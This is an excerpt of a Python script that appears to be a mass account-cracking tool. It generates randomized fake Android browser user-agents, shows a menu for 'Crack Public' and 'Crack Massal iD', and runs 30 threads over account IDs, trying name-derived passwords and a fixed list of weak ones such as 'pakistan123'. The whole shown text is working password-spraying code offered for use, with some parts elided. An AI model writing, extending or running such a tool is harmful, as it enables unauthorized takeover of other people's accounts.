...
for brayen in range(10000):
    ...
    build_number = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=6))
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; {model_name} Build/{build_number}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    ngentid = u1
    ugen.append(ngentid)
...
def menu(id):
	...
	banner()
	print(f'{ung}─────────────────────────────')
	print(f'{biru}━─═ ◕➤ Y  Crack Public')
	print(f'{biru}━─═ ◕➤ M  Crack Massal iD')
	print(f'{biru}━─═ ◕➤ K Cheack Accounts')
	...
	with prog:
		with tred(max_workers=30) as gas_krek:
			for yuzong in id2:
				...
				frs = nmf.split(' ')[0]
				full = nmf.replace(" ", "")
				pwv = ['pakistan123', 'Pakistan12345', 'Pakistan786', 'Pakistan1', 'pakistan12', 'pakistan', 'pakistan1234']
				pwt = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
